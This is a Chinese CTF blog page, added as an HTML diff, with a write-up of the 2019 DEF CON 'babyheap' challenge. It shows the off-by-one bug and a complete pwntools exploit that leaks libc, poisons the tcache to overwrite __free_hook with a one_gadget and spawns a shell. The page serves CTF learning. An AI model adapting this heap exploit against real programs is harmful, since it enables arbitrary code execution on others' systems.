@@ -1,0 +1,911 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <title>2019-DEFCON-CTF-babyheap | t1an5t&#39;s Treasure</title>
+  <meta name="keywords" content=" pwnable ">
+  <meta name="description" content="2019-DEFCON-CTF-babyheap | t1an5t&#39;s Treasure">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="easyvm虚拟机，虽然并不难，不过还是用angr直接秒了 import angr  proj = angr.Project(&amp;quot;./vm&amp;quot;,auto_load_libs=False)  st = proj.factory.entry_state() sm = proj.factory.simulation_manager(st) sm.explore(find=0x400b73">
+<meta name="keywords" content="reverse,writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020-网络安全公益赛-writeup-RE">
+<meta property="og:url" content="http://tianstcht.github.io/2020-网络安全公益赛-writeup-RE/index.html">
+<meta property="og:site_name" content="t1an5t&#39;s Treasure">
+<meta property="og:description" content="easyvm虚拟机，虽然并不难，不过还是用angr直接秒了 import angr  proj = angr.Project(&amp;quot;./vm&amp;quot;,auto_load_libs=False)  st = proj.factory.entry_state() sm = proj.factory.simulation_manager(st) sm.explore(find=0x400b73">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://tianstcht.github.io/2020-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-writeup-RE/1582515771061.png">
+<meta property="og:image" content="http://tianstcht.github.io/2020-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-writeup-RE/1582515660580.png">
+<meta property="og:image" content="http://tianstcht.github.io/2020-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-writeup-RE/1582516740847.png">
+<meta property="og:image" content="http://tianstcht.github.io/2020-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-writeup-RE/1582516899907.png">
+<meta property="og:image" content="http://tianstcht.github.io/2020-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-writeup-RE/1582515976960.png">
+<meta property="og:image" content="http://tianstcht.github.io/2020-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-writeup-RE/1582523576885.png">
+<meta property="og:image" content="http://tianstcht.github.io/2020-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-writeup-RE/1582555736774.png">
+<meta property="og:image" content="http://tianstcht.github.io/2020-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-writeup-RE/1582555751576.png">
+<meta property="og:image" content="http://tianstcht.github.io/2020-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-writeup-RE/1582636148648.png">
+<meta property="og:updated_time" content="2020-02-29T13:52:39.766Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2020-网络安全公益赛-writeup-RE">
+<meta name="twitter:description" content="easyvm虚拟机，虽然并不难，不过还是用angr直接秒了 import angr  proj = angr.Project(&amp;quot;./vm&amp;quot;,auto_load_libs=False)  st = proj.factory.entry_state() sm = proj.factory.simulation_manager(st) sm.explore(find=0x400b73">
+<meta name="twitter:image" content="http://tianstcht.github.io/2020-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-writeup-RE/1582515771061.png">
+
+<link rel="alternate" href="/atom.xml" title="t1an5t&#39;s Treasure" type="application/atom+xml">
+
+
+<link rel="icon" href="/img/djcx.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-dark.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1"></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+
+<script src="/js/iconfont.js?v=1.0.1"></script>
+
+</head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value>
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/djcx.jpg" />
+</a>
+<div class="author">
+    <span>t1an5t</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="github" href="https://github.com/tianstcht" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="email" href="mailto:1037178204@qq.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=1037178204&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active">全部文章<small>(17)</small></div></li>
+    
+        
+            
+            <li><div data-rel="CTF">CTF<small>(3)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="PWN">PWN<small>(6)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="RE">RE<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="NOTES">NOTES<small>(3)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="TIPS">TIPS<small>(3)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="ME">ME<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div><a class="about  site_url"  href="/">关于</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="17">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="/帅">0</a></li>
+            
+            <li><a target="_blank" href="/帅">1</a></li>
+            
+            <li><a target="_blank" href="/狗">2</a></li>
+            
+            <li><a target="_blank" href="/学">3</a></li>
+            
+            <li><a target="_blank" href="/弟">4</a></li>
+            
+            <li><a target="_blank" href="/:">5</a></li>
+            
+            <li><a target="_blank" href="/h">6</a></li>
+            
+            <li><a target="_blank" href="/t">7</a></li>
+            
+            <li><a target="_blank" href="/t">8</a></li>
+            
+            <li><a target="_blank" href="/p">9</a></li>
+            
+            <li><a target="_blank" href="/:">10</a></li>
+            
+            <li><a target="_blank" href="/">11</a></li>
+            
+            <li><a target="_blank" href="/">12</a></li>
+            
+            <li><a target="_blank" href="/h">13</a></li>
+            
+            <li><a target="_blank" href="/a">14</a></li>
+            
+            <li><a target="_blank" href="/n">15</a></li>
+            
+            <li><a target="_blank" href="/d">16</a></li>
+            
+            <li><a target="_blank" href="/s">17</a></li>
+            
+            <li><a target="_blank" href="/o">18</a></li>
+            
+            <li><a target="_blank" href="/m">19</a></li>
+            
+            <li><a target="_blank" href="/e">20</a></li>
+            
+            <li><a target="_blank" href="/d">21</a></li>
+            
+            <li><a target="_blank" href="/o">22</a></li>
+            
+            <li><a target="_blank" href="/g">23</a></li>
+            
+            <li><a target="_blank" href="/.">24</a></li>
+            
+            <li><a target="_blank" href="/t">25</a></li>
+            
+            <li><a target="_blank" href="/o">26</a></li>
+            
+            <li><a target="_blank" href="/p">27</a></li>
+            
+            <li><a target="_blank" href="/">28</a></li>
+            
+            <li><a target="_blank" href="/ ">29</a></li>
+            
+            <li><a target="_blank" href="/磊">30</a></li>
+            
+            <li><a target="_blank" href="/子">31</a></li>
+            
+            <li><a target="_blank" href="/哥">32</a></li>
+            
+            <li><a target="_blank" href="/:">33</a></li>
+            
+            <li><a target="_blank" href="/h">34</a></li>
+            
+            <li><a target="_blank" href="/t">35</a></li>
+            
+            <li><a target="_blank" href="/t">36</a></li>
+            
+            <li><a target="_blank" href="/p">37</a></li>
+            
+            <li><a target="_blank" href="/:">38</a></li>
+            
+            <li><a target="_blank" href="/">39</a></li>
+            
+            <li><a target="_blank" href="/">40</a></li>
+            
+            <li><a target="_blank" href="/h">41</a></li>
+            
+            <li><a target="_blank" href="/t">42</a></li>
+            
+            <li><a target="_blank" href="/t">43</a></li>
+            
+            <li><a target="_blank" href="/p">44</a></li>
+            
+            <li><a target="_blank" href="/:">45</a></li>
+            
+            <li><a target="_blank" href="/">46</a></li>
+            
+            <li><a target="_blank" href="/">47</a></li>
+            
+            <li><a target="_blank" href="/i">48</a></li>
+            
+            <li><a target="_blank" href="/g">49</a></li>
+            
+            <li><a target="_blank" href="/m">50</a></li>
+            
+            <li><a target="_blank" href="/l">51</a></li>
+            
+            <li><a target="_blank" href="/.">52</a></li>
+            
+            <li><a target="_blank" href="/t">53</a></li>
+            
+            <li><a target="_blank" href="/o">54</a></li>
+            
+            <li><a target="_blank" href="/p">55</a></li>
+            
+            <li><a target="_blank" href="/">56</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode === 13){return false;}">
+        <input id="local-search-input" class="search" type="text" placeholder="Search..." />
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a class="color3">pwnable</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">ctf</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">2019</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">reverse</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">writeup</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">elf</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">kernel</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">glibc</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">pwntools</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">tw</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class="CTF "
+           href="/2019-ByteCTF-writeup-PWN/"
+           data-tag="pwnable,ctf,2019"
+           data-author="" >
+            <span class="post-title" title="2019-ByteCTF-writeup-PWN">2019-ByteCTF-writeup-PWN</span>
+            <span class="post-date" title="2019-09-19 22:33:33">2019/09/19</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/2019-ROAR-CTF-easy_heap/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="2019-ROAR-CTF-easy_heap">2019-ROAR-CTF-easy_heap</span>
+            <span class="post-date" title="2020-02-06 10:52:00">2020/02/06</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/2019-ROAR-CTF-ez_op/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="2019-ROAR-CTF-ez_op">2019-ROAR-CTF-ez_op</span>
+            <span class="post-date" title="2020-02-07 11:02:00">2020/02/07</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/2019-DEFCON-CTF-babyheap/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="2019-DEFCON-CTF-babyheap">2019-DEFCON-CTF-babyheap</span>
+            <span class="post-date" title="2020-02-09 11:19:00">2020/02/09</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019-CISCN-东北赛区线下赛-writeup-PWN/"
+           data-tag="pwnable,ctf"
+           data-author="" >
+            <span class="post-title" title="2019-CISCN-东北赛区线下赛-writeup-PWN">2019-CISCN-东北赛区线下赛-writeup-PWN</span>
+            <span class="post-date" title="2019-06-23 21:13:37">2019/06/23</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019-NEX招新赛-writeup-PWN/"
+           data-tag="pwnable,ctf"
+           data-author="" >
+            <span class="post-title" title="2019-NEX招新赛-writeup-PWN">2019-NEX招新赛-writeup-PWN</span>
+            <span class="post-date" title="2019-10-27 21:52:33">2019/10/27</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/2019-ROAR-CTF-realloc_magic/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="2019-roarCTF-realloc_magic">2019-roarCTF-realloc_magic</span>
+            <span class="post-date" title="2020-02-07 11:02:00">2020/02/07</span>
+        </a>
+        
+        <a  class="RE "
+           href="/2020-网络安全公益赛-writeup-RE/"
+           data-tag="reverse,writeup"
+           data-author="" >
+            <span class="post-title" title="2020-网络安全公益赛-writeup-RE">2020-网络安全公益赛-writeup-RE</span>
+            <span class="post-date" title="2020-02-26 23:01:00">2020/02/26</span>
+        </a>
+        
+        <a  class="NOTES "
+           href="/ELF文件在加载过程中需要关注的部分/"
+           data-tag="elf"
+           data-author="" >
+            <span class="post-title" title="ELF文件在加载过程中需要关注的部分">ELF文件在加载过程中需要关注的部分</span>
+            <span class="post-date" title="2020-02-06 18:01:20">2020/02/06</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/KERNEL-CSAW-2010-kernel/"
+           data-tag="pwnable,kernel"
+           data-author="" >
+            <span class="post-title" title="KERNEL-CSAW-2010-kernel">KERNEL-CSAW-2010-kernel</span>
+            <span class="post-date" title="2019-06-20 19:42:11">2019/06/20</span>
+        </a>
+        
+        <a  class="NOTES "
+           href="/glibc-malloc-c源码阅读笔记/"
+           data-tag="glibc"
+           data-author="" >
+            <span class="post-title" title="glibc-malloc.c源码阅读笔记">glibc-malloc.c源码阅读笔记</span>
+            <span class="post-date" title="2019-07-17 16:18:02">2019/07/17</span>
+        </a>
+        
+        <a  class="TIPS "
+           href="/pwntools的使用技巧/"
+           data-tag="pwnable,pwntools"
+           data-author="" >
+            <span class="post-title" title="pwntools的使用技巧">pwntools的使用技巧</span>
+            <span class="post-date" title="2019-06-19 15:26:27">2019/06/19</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/pwnab13-7w/"
+           data-tag="pwnable,tw"
+           data-author="" >
+            <span class="post-title" title="pwnab13.7w">pwnab13.7w</span>
+            <span class="post-date" title="2019-06-19 15:14:30">2019/06/19</span>
+        </a>
+        
+        <a  class="TIPS "
+           href="/pwn里的一些patch心得/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="pwn里的一些patch心得">pwn里的一些patch心得</span>
+            <span class="post-date" title="2019-06-23 21:13:57">2019/06/23</span>
+        </a>
+        
+        <a  class="ME "
+           href="/t1an5t的2020/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="t1an5t的2020">t1an5t的2020</span>
+            <span class="post-date" title="1999-01-01 15:13:07">1999/01/01</span>
+        </a>
+        
+        <a  class="TIPS "
+           href="/造轮子/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="造轮子">造轮子</span>
+            <span class="post-date" title="2019-06-19 15:40:33">2019/06/19</span>
+        </a>
+        
+        <a  class="NOTES "
+           href="/glibc2.30代码阅读/"
+           data-tag="glibc"
+           data-author="" >
+            <span class="post-title" title="glibc2.30代码阅读笔记">glibc2.30代码阅读笔记</span>
+            <span class="post-date" title="2020-02-14 20:26:20">2020/02/14</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-2019-DEFCON-CTF-babyheap" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">2019-DEFCON-CTF-babyheap</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a  data-rel="PWN">PWN</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color3">pwnable</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2020-02-29 21:33:16'>2020-02-09 11:19</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>环境是2.29，菜单堆，开了PIE。</p>
+<p>堆块最多可以开辟十个，size只有两种方式：</p>
+<pre><code class="C">if ( size - 1 &gt; 0x177 )
+    return 0xFFFFFFFDLL;
+if ( size &lt;= 0xF8 )
+    chunkbss_qword_4060[2 * i] = malloc(0xF8uLL);
+else
+    chunkbss_qword_4060[2 * i] = malloc(0x178uLL);</code></pre>
+<p>读入数据的时候存在<code>off-by-one</code>：</p>
+<pre><code class="C">__printf_chk(1LL, &quot;Content:\n&gt; &quot;);
+read(0, &amp;chr, 1uLL);
+off = 0LL;
+ptr = &amp;chunkbss_qword_4060[2 * i];
+while ( chr != &#39;\n&#39; &amp;&amp; chr )
+{
+    (*ptr)[off] = chr;
+    read(0, &amp;chr, 1uLL);
+    if ( size == off )
+        return 0LL;
+    ++off;
+}</code></pre>
+<p>free函数没问题。</p>
+<p>存在show函数（好不习惯，好久都没见过带show的了），可以考虑用来泄露。</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>2.29下会对<code>tcache</code>进行遍历对应<code>tcache_entry</code>链的检查来杀死<code>double free</code>，同时还有干掉<code>off-by-null</code>的一个检测，其他的暂时还没接触。</p>
+<p>首先要考虑的就是泄露libc，因为有<code>show</code>的缘故，所以直接就可以泄露了</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code class="python">from pwn_debug import *
+from pwn import success
+
+pd = pwn_debug(&quot;./babyheap&quot;)
+pd.context.terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+#pd.context.log_level = &quot;debug&quot;
+
+pd.local(&quot;./libc.so&quot;, &quot;/glibc/x64/2.29/lib/ld-2.29.so&quot;)
+pd.debug(&quot;2.29&quot;)
+
+p = pd.run(&quot;local&quot;)
+
+ru = lambda x : p.recvuntil(x)
+sn = lambda x : p.send(x)
+rl = lambda : p.recvline()
+sl = lambda x : p.sendline(x)
+rv = lambda x : p.recv(x)
+sa = lambda a,b : p.sendafter(a,b)
+sla = lambda a,b : p.sendlineafter(a, b)
+
+def choose(idx):
+    sla(&quot;&gt; &quot;, idx)
+
+def malloc(size, ctx):
+    choose(&quot;M&quot;)
+    sla(&quot;&gt; &quot;, str(size))
+    sla(&quot;&gt; &quot;, ctx)
+
+def free(idx):
+    choose(&quot;F&quot;)
+    sla(&quot;&gt; \n&quot;, str(idx))
+
+def show(idx):
+    choose(&quot;S&quot;)
+    sla(&quot;&gt; &quot;, str(idx))
+
+pd.bp(watch=[0x4060])
+
+malloc(0xf8, &quot;1&quot;)
+malloc(0xf8, &quot;1&quot;)
+
+malloc(0x178, &quot;a&quot;*0x78+&quot;\x01\x01&quot;)
+for i in range(7):
+    malloc(0x178, &quot;2&quot;)
+
+for i in range(3, 10):
+    free(i)
+
+free(0)
+malloc(0xf8, &quot;a&quot;*0xf8+&quot;\x81&quot;)
+free(1)
+malloc(0xf8, &quot;&quot;)
+show(2)
+
+leak = u64(p.recvuntil(&quot;\x7f&quot;).ljust(8, &quot;\x00&quot;))
+success(hex(leak))
+success(hex(leak-pd.membp.libc_base))
+libc_base = leak-0x1e4ca0
+success(hex(libc_base))
+pd.membp.libc_base = pd.libc.address = libc_base
+
+malloc(0x178, &quot;b&quot;)
+malloc(0x178, &quot;b&quot;)
+malloc(0xf8, &quot;c&quot;)
+malloc(0xf8, &quot;c&quot;)
+malloc(0xf8, &quot;c&quot;)
+
+free(6)
+malloc(0xf8, &quot;a&quot;*0xf8+&quot;\x81&quot;)
+free(7)
+
+free(5)
+malloc(0xf8, &quot;a&quot;*0xf8+&quot;\x81&quot;)
+free(6)
+
+malloc(0x178, &quot;a&quot;*0x100+p64(pd.libc.sym[&#39;__free_hook&#39;])[:-2])
+malloc(0x178, &quot;a&quot;)
+
+one = pd.one_gadget()
+malloc(0x178, p64(one[1])[:-2])
+
+free(0)
+
+p.interactive()
+</code></pre>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://m.blog.naver.com/PostView.nhn?blogId=yjw_sz&amp;logNo=221539019506&amp;proxyReferer=https%3A%2F%2Fwww.google.com%2F" target="_blank" rel="noopener">https://m.blog.naver.com/PostView.nhn?blogId=yjw_sz&amp;logNo=221539019506&amp;proxyReferer=https%3A%2F%2Fwww.google.com%2F</a></p>
+<p><a href="https://www.nullbyte.cat/post/babyheap-def-con-ctf-qualifier-2019/#challenge-solution" target="_blank" rel="noopener">https://www.nullbyte.cat/post/babyheap-def-con-ctf-qualifier-2019/#challenge-solution</a></p>
+<p><a href="https://lanph3re.github.io/defcon2019babyheap" target="_blank" rel="noopener">https://lanph3re.github.io/defcon2019babyheap</a></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1037178204@qq.com </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>2019-DEFCON-CTF-babyheap</p>
+    
+    <p><span class="copy-title">本文作者:</span><a  title="t1an5t">t1an5t</a></p>
+    <p><span class="copy-title">发布时间:</span>2020-02-09, 11:19:00</p>
+    <p><span class="copy-title">最后更新:</span>2020-02-29, 21:33:16</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019-DEFCON-CTF-babyheap/" title="2019-DEFCON-CTF-babyheap">http://tianstcht.github.io/2019-DEFCON-CTF-babyheap/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2019-2020 t1an5t</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#pwnable','#ctf','#2019','#reverse','#writeup','#elf','#kernel','#glibc','#pwntools','#tw',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
